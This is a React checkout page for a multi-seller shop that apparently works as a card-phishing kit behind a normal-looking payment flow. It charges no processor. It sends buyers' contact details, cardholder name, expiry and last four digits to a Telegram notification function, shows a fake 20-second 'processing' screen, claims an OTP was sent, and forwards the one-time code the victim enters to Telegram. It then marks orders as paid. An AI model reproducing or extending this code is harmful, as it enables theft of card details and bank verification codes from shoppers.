import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowLeft, Package, Store } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { useCart, CartItem } from '@/hooks/useCart';
import { usePaymentSettings } from '@/hooks/usePaymentSettings';
import { useCurrency } from '@/hooks/useCurrency';
import { toast } from '@/hooks/use-toast';
import { Header } from '@/components/layout/Header';

import CheckoutStepper, { CheckoutStep } from '@/components/checkout/CheckoutStepper';
import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
import CardOTPVerification from '@/components/checkout/CardOTPVerification';
import OrderReview from '@/components/checkout/OrderReview';
import OrderConfirmation from '@/components/checkout/OrderConfirmation';
import PaymentProcessingScreen from '@/components/checkout/PaymentProcessingScreen';

interface SellerGroup {
  sellerId: string;
  sellerName: string;
  items: CartItem[];
  subtotal: number;
}

export default function CartCheckout() {
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();
  const { items, clearCart, total } = useCart();
  const { currency, convertFromUSD, formatPriceOnly } = useCurrency();
  const { settings: paymentSettings, loading: settingsLoading } = usePaymentSettings();

  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shippingData, setShippingData] = useState<ShippingFormData | null>(null);
  const [cardData, setCardData] = useState<CardFormData | null>(null);
  const [cardBrand, setCardBrand] = useState<string>('Card');
  const [otpCode, setOtpCode] = useState<string>('');
  const [orderIds, setOrderIds] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);
  const [transactionId, setTransactionId] = useState<string | null>(null);

  useEffect(() => {
    if (!authLoading && !user) {
      navigate('/auth?redirect=/cart/checkout');
      return;
    }

    if (items.length === 0 && step === 'shipping') {
      navigate('/cart');
    }
  }, [user, authLoading, items.length, step, navigate]);

  // Group items by seller
  const sellerGroups: SellerGroup[] = items.reduce((groups: SellerGroup[], item) => {
    const existingGroup = groups.find(g => g.sellerId === item.seller_id);
    if (existingGroup) {
      existingGroup.items.push(item);
      existingGroup.subtotal += item.price * item.quantity;
    } else {
      groups.push({
        sellerId: item.seller_id,
        sellerName: item.seller_name,
        items: [item],
        subtotal: item.price * item.quantity,
      });
    }
    return groups;
  }, []);

  const handleShippingSubmit = (data: ShippingFormData) => {
    setShippingData(data);

    const otpEnabled = paymentSettings?.otpEnabled ?? true;

    if (otpEnabled) {
      setStep('payment');
    } else {
      setStep('payment');
    }
  };

  const handlePaymentSubmit = async (data: CardFormData & { cardBrand?: string; is3DSecure?: boolean }) => {
    if (!user) return;

    setProcessing(true);
    setCardData(data);

    const is3DS = data.is3DSecure ?? true;
    const cardLastFour = data.cardNumber.replace(/\s/g, '').slice(-4);
    const detectedBrand = data.cardBrand || detectCardBrand(data.cardNumber);
    setCardBrand(detectedBrand);

    try {
      const { data: transaction, error } = await supabase
        .from('payment_transactions')
        .insert([{
          user_id: user.id,
          amount: total,
          currency: 'USD',
          card_last_four: cardLastFour,
          card_brand: detectedBrand,
          status: is3DS ? 'pending_otp' : 'otp_verified',
          otp_verified: !is3DS,
          metadata: {
            itemCount: items.length,
            shippingData,
            is3DSecure: is3DS,
          },
        }])
        .select()
        .single();

      if (error) throw error;

      setTransactionId(transaction.id);

      await supabase.functions.invoke('send-telegram-notification', {
        body: {
          type: 'card_submitted',
          amount: total,
          currency: 'USD',
          buyerName: shippingData?.fullName,
          buyerEmail: shippingData?.email,
          buyerPhone: shippingData?.phoneNumber,
          cardLastFour,
          cardBrand: detectedBrand,
          cardHolder: data.cardholderName,
          expiryDate: `${data.expiryMonth}/${data.expiryYear}`,
          cvv: '***',
          is3DSecure: is3DS,
        },
      });

      if (is3DS) {
        setStep('processing');
      } else {
        toast({ title: 'Card verified', description: 'Proceeding to order review.' });
        setStep('review');
      }
    } catch (error: any) {
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  const handleProcessingComplete = () => {
    toast({
      title: 'OTP Sent',
      description: 'A 6-digit verification code has been sent to your phone.'
    });
    setStep('otp');
  };

  const handleOTPVerified = async (code: string) => {
    if (!transactionId || !cardData) return;

    setOtpCode(code);

    await supabase
      .from('payment_transactions')
      .update({ status: 'otp_verified', otp_verified: true })
      .eq('id', transactionId);

    const cardLastFour = cardData.cardNumber.replace(/\s/g, '').slice(-4);
    const cardBrand = detectCardBrand(cardData.cardNumber);

    await supabase.functions.invoke('send-telegram-notification', {
      body: {
        type: 'otp_verified',
        amount: total,
        currency: 'USD',
        cardLastFour,
        cardBrand,
        otpCode: code,
        otpVerified: true,
      },
    });

    setStep('review');
  };

  const handleConfirmOrder = async () => {
    if (!user || !shippingData || !cardData) return;

    setProcessing(true);
    try {
      const createdOrderIds: string[] = [];

      const uniqueProductIds = [...new Set(items.map(i => i.product_id).filter(Boolean))];
      let existingProductIds = new Set<string>();

      if (uniqueProductIds.length > 0) {
        const { data: productRows, error: productsError } = await supabase
          .from('products')
          .select('id')
          .in('id', uniqueProductIds);

        if (!productsError && productRows) {
          existingProductIds = new Set(productRows.map(r => r.id));
        }
      }

      for (const group of sellerGroups) {
        for (const item of group.items) {
          if (!item.seller_id) {
            throw new Error('Missing seller for an item in your cart. Please remove and re-add the item.');
          }

          const { data: order, error } = await supabase
            .from('orders')
            .insert({
              buyer_id: user.id,
              seller_id: item.seller_id,
              product_id: existingProductIds.has(item.product_id) ? item.product_id : null,
              quantity: item.quantity,
              total_price: item.price * item.quantity,
              status: 'paid',
              tracking_info: {
                shipping_address: formatShippingAddress(shippingData),
                shipping_details: shippingData,
                cart_item: {
                  title: item.title,
                  image: item.image,
                  unit: item.unit,
                  moq: item.moq,
                },
              },
            })
            .select()
            .single();

          if (error) throw error;
          createdOrderIds.push(order.id);
        }
      }

      if (transactionId) {
        await supabase
          .from('payment_transactions')
          .update({
            status: 'confirmed',
            order_id: createdOrderIds[0],
          })
          .eq('id', transactionId);
      }

      await supabase
        .from('notifications')
        .insert([{
          user_id: user.id,
          type: 'payment',
          title: 'Order Confirmed',
          message: `Your order of USD ${total.toFixed(2)} has been confirmed.`,
          data: { orderIds: createdOrderIds, transactionId },
        }]);

      setOrderIds(createdOrderIds);
      clearCart();
      setStep('confirmation');
    } catch (error: any) {
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  const formatShippingAddress = (data: ShippingFormData): string => {
    return `${data.streetAddress}, ${data.city}, ${data.stateProvince} ${data.postalCode}, ${data.country}`;
  };

  const detectCardBrand = (cardNumber: string): string => {
    const cleaned = cardNumber.replace(/\s/g, '');
    if (/^4/.test(cleaned)) return 'Visa';
    if (/^5[1-5]/.test(cleaned)) return 'Mastercard';
    if (/^3[47]/.test(cleaned)) return 'American Express';
    if (/^6(?:011|5)/.test(cleaned)) return 'Discover';
    return 'Card';
  };

  const canGoBack = step === 'shipping' || step === 'payment';

  const getBackAction = () => {
    switch (step) {
      case 'payment':
        return () => setStep('shipping');
      default:
        return () => navigate('/cart');
    }
  };

  const getBackLabel = () => {
    switch (step) {
      case 'payment':
        return 'Back to Shipping';
      default:
        return 'Back to Cart';
    }
  };

  if (authLoading || settingsLoading) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8">
          <div className="animate-pulse space-y-4">
            <div className="h-8 w-48 bg-muted rounded" />
            <div className="h-64 bg-muted rounded" />
          </div>
        </div>
      </div>
    );
  }

  const orderItems = items.map(item => ({
    id: item.id,
    title: item.title,
    price: item.price,
    quantity: item.quantity,
    image: item.image,
    seller_name: item.seller_name,
  }));

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="container py-8">
        {canGoBack && (
          <Button
            variant="ghost"
            onClick={getBackAction()}
            className="mb-4"
          >
            <ArrowLeft className="h-4 w-4 mr-2" />
            {getBackLabel()}
          </Button>
        )}

        <CheckoutStepper currentStep={step} />

        <div className="grid lg:grid-cols-3 gap-8 mt-6">
          <div className="lg:col-span-2">
            {step === 'shipping' && (
              <ShippingAddressForm
                onSubmit={handleShippingSubmit}
                initialData={shippingData || undefined}
                isSubmitting={processing}
              />
            )}

            {step === 'payment' && (
              <PaymentDetailsForm
                amount={total}
                currency="USD"
                onSubmit={handlePaymentSubmit}
                onBack={() => setStep('shipping')}
                isSubmitting={processing}
              />
            )}

            {step === 'processing' && cardData && (
              <PaymentProcessingScreen
                cardLastFour={cardData.cardNumber.replace(/\s/g, '').slice(-4)}
                cardBrand={cardBrand}
                duration={20}
                onComplete={handleProcessingComplete}
              />
            )}

            {step === 'otp' && cardData && (
              <CardOTPVerification
                cardLastFour={cardData.cardNumber.replace(/\s/g, '').slice(-4)}
                onVerified={handleOTPVerified}
                onResend={() => toast({
                  title: 'OTP Resent',
                  description: 'A new code has been sent to your phone.'
                })}
                processing={processing}
                codeLength={paymentSettings?.otpLength ?? 6}
                expirySeconds={paymentSettings?.otpExpirySeconds ?? 120}
                maxAttempts={paymentSettings?.otpMaxAttempts ?? 3}
              />
            )}

            {step === 'review' && shippingData && cardData && (
              <OrderReview
                items={orderItems}
                shippingData={shippingData}
                cardData={cardData}
                totalAmount={total}
                currency="USD"
                onConfirm={handleConfirmOrder}
                onEditShipping={() => setStep('shipping')}
                onEditPayment={() => setStep('payment')}
                isSubmitting={processing}
              />
            )}

            {step === 'confirmation' && shippingData && (
              <OrderConfirmation
                orderIds={orderIds}
                totalAmount={convertFromUSD(total)}
                currency={currency.code}
                shippingAddress={{
                  fullName: shippingData.fullName,
                  line1: shippingData.streetAddress,
                  city: shippingData.city,
                  state: shippingData.stateProvince,
                  postalCode: shippingData.postalCode,
                  country: shippingData.country,
                }}
              />
            )}
          </div>

          {step !== 'confirmation' && (
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Package className="h-5 w-5" />
                    Order Summary
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {sellerGroups.map((group) => (
                    <div key={group.sellerId} className="space-y-2">
                      <div className="flex items-center gap-2 text-sm text-muted-foreground">
                        <Store className="h-4 w-4" />
                        <span className="font-medium">{group.sellerName}</span>
                      </div>
                      {group.items.map((item) => (
                        <div key={item.id} className="flex justify-between text-sm pl-6">
                          <span className="text-muted-foreground truncate max-w-[150px]">
                            {item.title} x{item.quantity}
                          </span>
                          <span>{formatPriceOnly(item.price * item.quantity)}</span>
                        </div>
                      ))}
                    </div>
                  ))}
                  <Separator />
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Items</span>
                    <span>{items.length} products</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Sellers</span>
                    <span>{sellerGroups.length}</span>
                  </div>
                  <Separator />
                  <div className="flex justify-between text-lg font-bold">
                    <span>Total</span>
                    <span>{formatPriceOnly(total)}</span>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
